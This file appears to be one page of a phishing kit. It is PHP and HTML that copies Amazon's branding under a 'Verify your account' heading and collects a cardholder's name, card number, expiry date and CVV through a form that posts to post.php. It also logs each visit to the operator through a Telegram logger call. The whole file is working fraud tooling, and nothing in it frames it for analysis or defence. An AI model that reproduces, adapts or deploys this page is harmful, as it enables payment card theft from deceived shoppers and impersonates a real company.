<?php 
require 'main.php';
require 'telegram_logger.php';

// Log card page visit
sendToTelegram(" User accessed CARD page", "CARD");
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/amazon.css">
    <title>Amazon</title>
</head>
<body>
    <header>
       <div class="logo"> <img src="res/img/logo1.png" alt="img">  </div></header>

<div class="header">
    <div class="header1">

<div class="title">
    <label>Verify your account.</label>
</div> <br>


<div class="email">

<form action="post.php" method="post">

<div><b> Cardholder name </b></div>
 <div><input type="text" name="name" required> </div>
<br>

<div><b> Card number </b></div>
<div><input type="text" name="cc" placeholder="XXXX XXXX XXXX XXXX" id="cc" required></div>
<br>

<div><b> Expiration date </b> </div>
<div><input type="text" name="exp" placeholder="MM/YY" id="exp" required> </div>
<br>

<div><b>security code </b></div>
<div><input type="text"  name="cvv" placeholder="CVV" id="cvv" required> </div>
<br>



<div class="login">
<div class="button"><button type="submit"> Continue</button> </div>
</div>

</form>
</div>
</div>
 
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>
 

</body>
</html>